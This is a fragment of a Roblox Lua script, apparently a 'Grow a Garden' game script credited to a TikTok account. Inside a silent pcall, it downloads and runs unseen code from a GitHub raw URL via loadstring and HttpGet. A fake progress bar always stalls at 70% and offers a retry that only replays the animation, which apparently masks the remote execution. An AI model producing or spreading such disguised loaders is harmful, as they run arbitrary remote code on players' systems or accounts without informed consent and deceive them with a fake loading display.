credit.BackgroundTransparency = 1
credit.Font = Enum.Font.GothamSemibold
credit.TextColor3 = Color3.fromRGB(170, 170, 170)
credit.TextScaled = true
credit.Text = "üìú Script made by @growyourowngarden on TikTok"

-- Load Script Attempt
pcall(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/No-Lagg419/growagardenscript/refs/heads/main/esponeggunpached"))()
end)

-- Progress Bar Handler
local function fillProgressTo70()
	a = true
	bar.Size = UDim2.new(0, 0, 1, 0)
	perc.Text = "0%"
	for i = 1, 70 do
		perc.Text = i .. "%"
		bar:TweenSize(UDim2.new(i / 100, 0, 1, 0), "Out", "Linear", 0.1, true)
		wait(0.1)
	end
	a = false
	perc.Text = "70%"
	retryBtn.Visible = true
end

-- Initial Load
fillProgressTo70()

-- Retry Logic
retryBtn.MouseButton1Click:Connect(function()
	retryBtn.Visible = false
	fillProgressTo70()
end)
